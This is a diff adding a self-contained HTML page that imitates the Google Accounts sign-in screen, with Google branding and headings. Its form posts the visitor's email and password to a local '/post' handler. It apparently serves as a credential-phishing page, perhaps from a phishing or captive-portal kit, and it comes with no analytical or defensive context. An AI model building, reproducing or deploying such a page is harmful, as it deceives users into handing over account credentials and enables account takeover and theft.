@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in - Google Accounts</title>
+<style>
+body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
+.container{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;width:90%;max-width:450px}
+.logo{width:75px;height:24px;margin:0 auto 16px;background:#4285f4;border-radius:2px;text-align:center;color:white;line-height:24px;font-weight:500}
+h1{font-size:24px;font-weight:400;margin:0 0 8px;color:#202124;text-align:center}
+.subtitle{color:#5f6368;font-size:16px;text-align:center;margin-bottom:24px}
+input{width:100%;padding:13px 15px;margin:8px 0 16px;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box;font-size:16px}
+input:focus{outline:none;border:2px solid #1a73e8}
+button{width:100%;padding:10px;margin:8px 0;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;font-size:14px;font-weight:500}
+button:hover{background:#1765cc;box-shadow:0 1px 2px 0 rgba(60,64,67,.3),0 1px 3px 1px rgba(60,64,67,.15)}
+.link{text-align:center;margin-top:20px}
+a{color:#1a73e8;text-decoration:none;font-size:14px}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo">Google</div>
+<h1>Sign in</h1>
+<div class="subtitle">Use your Google Account</div>
+<form action="/post" method="POST">
+<input type="email" name="email" placeholder="Email or phone" required>
+<input type="password" name="password" placeholder="Enter your password" required>
+<button type="submit">Next</button>
+</form>
+<div class="link">
+<a href="/">Use another account</a>
+</div>
+</div>
+</body>
+</html>
+
+
+
